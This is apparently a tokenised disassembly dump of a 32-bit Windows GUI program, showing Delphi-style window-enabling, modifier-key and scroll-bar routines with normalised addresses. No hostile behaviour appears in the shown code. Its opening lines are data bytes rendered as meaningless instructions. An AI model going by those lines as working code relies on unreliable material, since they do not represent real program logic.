add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x5fffb9b9 ] ch
add [ eax ] al
add [ eax + 0x69 ] dl
inc ecx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
clc
mov ch 0x46
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + 0xd ] al
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ eax ] bl
push cs
inc edx
add ah ah
or al 0x42
add [ eax ] ch
push cs
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0xe0046b4 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
mov eax 0x7004647
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
push 0x4c004647
push 0x41
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
insb
jae r-xdata
add [ ecx + rw-data ] ah
retn
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6800408d
inc edi
inc esi
xor [ eax ] eax
jb r-xdata
sub_4648ec
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_464938
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46e16c
mov eax [ rw-data ]
call sub_420c68
mov eax [ rw-data ]
call sub_420c10
retn
push 0x0
push eax
call ShowOwnedPopups
sub_464970
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_4649c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_464a63
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_40363c#8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_464970
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464a6a
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_464a74
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402714
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_464aac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_464b10
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_464aac
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_464b6c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_464b8c
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_464b6c
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_464bb8
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_46b74c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_46bbbc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407d60
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46b738
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46bba8
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407d60
test eax eax
je r-xdata
sub_464c54
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_464ca8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_464ce4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_464d50
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464dae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_461f8c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040d4
mov eax [ ebp - 0x8 ]
pop edx
call sub_407d60
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464db5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
sub_464dc0
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_464de8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_464e59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_464dc0
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e60
lea eax [ ebp - 0xc ]
call sub_403eec
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
sub_464e68
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_464ef8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b70
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4657c0
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4657a0
mov edx [ edi + 0xc ]
mov eax ebx
call sub_465650
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_464f48
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_465100
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44dca8
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_465650
xor edx edx
mov eax ebx
call sub_465650
jmp r-xdata
sub_464f80
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_429464
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_464fec
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_429464
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_465054
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_465788
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_450b4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_465788
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_450b10
call sub_464fec
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_450b10
call sub_464f80
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_465100
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_453e1c
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_465138
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_46516c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_465138
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_465138
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_4651e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_46516c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d038
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_46516c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d07c
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_465280
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_4652e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4654b1 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4651e8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4651e8
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_465650
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
push ebp
call sub_465280
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
push ebp
call sub_465280
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406a44
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_465650
jmp r-xdata
sub_4655d8
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_465cc8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_465650
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_453e1c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_453e1c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_4539d4
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_4539d4
jmp r-xdata
call sub_464dc0
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_465714
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_465cc8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4657cc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
call sub_42c1a8
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
call sub_42c1a8
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
call sub_42c1a8
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423584
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
call sub_42c1a8
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_453e1c
push eax
call sub_42c1a8
sub_4658d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4651e8
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4651e8
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
